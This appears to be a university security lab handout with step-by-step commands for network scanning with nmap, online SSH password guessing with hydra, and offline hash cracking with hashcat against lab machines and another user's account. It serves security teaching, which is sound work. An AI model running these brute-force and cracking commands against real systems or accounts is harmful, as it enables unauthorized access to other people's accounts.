# **Sigurnost računala i podataka** <!-- omit in toc -->

- [Lab 6: Online and Offline Password Guessing](#lab-6-online-and-offline-password-guessing)
  - [Online Password Guessing](#online-password-guessing)
  - [Offline Password Guessing](#offline-password-guessing)

## Lab 6: Online and Offline Password Guessing

### Online Password Guessing

1. Open bash shell in WSL on your local Windows machine.
2. Check that you can reach the lab server by pinging it.
    
    ```bash
    ping challenges.local
    ```
    
3. Install `nmap` application. In the bash shell execute the following commands.
    
    ```bash
    sudo apt-get update
    sudo apt-get install nmap
    
    # Test it
    nmap
    ```
    
    Try to understand what is `nmap` used for (Google it).
    
4. Next, run the following command.
    
    ```bash
    nmap -v 10.0.15.0/28
    ```
    
    Comment the results.
    
5. Try to open a remote shell on a dedicated machine. Use `ssh` client from your local shell as shown below:
    
    ```bash
    # ssh <username>@<your hostname>
    # (e.g., for username "doe_john", the hostname will be "doejohn.local") 
    ssh doe_john@doejohn.local
    ```
    
6. Install `hydra` application. Get to know it. Now, try to perform an **online password guessing attack** against your account. You know the following information about the used password:
    - it is comprised of lowercase letters
    - its length between 4 and 6 characters
    
    **Q1:** Estimate the password space.
    
    ```bash
    # hydra -l <username> -x 4:6:a <your IP address or hostname> -V -t 1 ssh
    hydra -l doe_john -x 4:6:a doejohn.local -V -t 1 ssh
    ```
    
    **Q2:** Using the output produced by `hydra` try to estimate your effort, that is how long it would take, on average, before you succeed. You can also try to play with parameter `-t` (**IMPORTANT:** Test values 2, 3, 4 but please do not exaggerate to avoid crushing the server).
    
    **Q3:** What do your do if the estimated time from the previous question is prohibitively large?
    
7. Get the dictionary from [http://challenges.local](http://a507-server.local:8080/) as follows (please mind the **group ID**).
    
    ```bash
    # For GROUP 1 (g1)
    wget -r -nH -np --reject "index.html*" http://challenges.local/dictionary/g1/
    ```
    
8. Finally, use `hydra` with the dictionary as shown below (IMPORTANT: use `dictionary_online.txt`).
    
    ```bash
    # hydra -l <username> -P dictionary/<group ID>/dictionary_online.txt 10.0.15.1 -V -t 4 ssh
    hydra -l doe_john -P dictionary/g1/dictionary_online.txt 10.0.15.1 -V -t 4 ssh
    ```
    
9. Try to login to your machine using the discovered password. Locate password hashes, select one account (different from your own) and try to learn the corresponding password using **offline password guessing** attack as outlined in the sequel.

### Offline Password Guessing

1. For this task, use `hashcat` tool. Install it on your local machine as follows.
    
    ```bash
    sudo apt-get install hashcat
    
    # Test it
    hashcat
    ```
    
2. Save the password hash obtained in the previous task into a file. To make this step somewhat easier, open the present folder in Visual Studio Code by running the following command.
    
    ```bash
    code .
    ```
    
3. Start offline guessing attack by executing the following command. As in the previous task you know the following about the password:
    - it is comprised of lowercase letters
    - its length is exactly 6 characters
    
    ```bash
    # hashcat --force -m 1800 -a 3 <password_hash_file> ?l?l?l?l?l?l --status --status-timer 10
    hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
    ```
    
    **Q1:** Estimate the password space.
    
    **Q2:** Using the output produced by `hashcat` try to estimate your effort, that is how long it would take, on average, before you succeed.
    
    **Q3:** What do your do if the estimated time from the previous question is prohibitively large?
    
4. If the attack from the previous step is not feasible approach, try a dictionary-based guessing attack (**IMPORTANT:** use `dictionary_offline.txt`). 
    
    As before you can get the dictionary by executing the following in the local (WSL) bash shell (in the same directory where you stored the password hash file).
    
    ```bash
    # For GROUP 1 (g1)
    wget -r -nH -np --reject "index.html*" http://challenges.local/dictionary/g1/
    ```
    
    Now start `hashcat` using the following command.
    
    ```bash
    # hashcat --force -m 1800 -a 0 <password_hash_file> <dictionary_file> --status --status-timer 10
    hashcat --force -m 1800 -a 0 password_hash.txt dictionary/g1/dictionary_offline.txt --status --status-timer 10
    ```
    
5. Test validity of the cracked password by logging into the remote machine as follows.
    
    ```bash
    # ssh <username>@<your IP address or hostname>
    ssh freddie_mercury@doejohn.local
    ```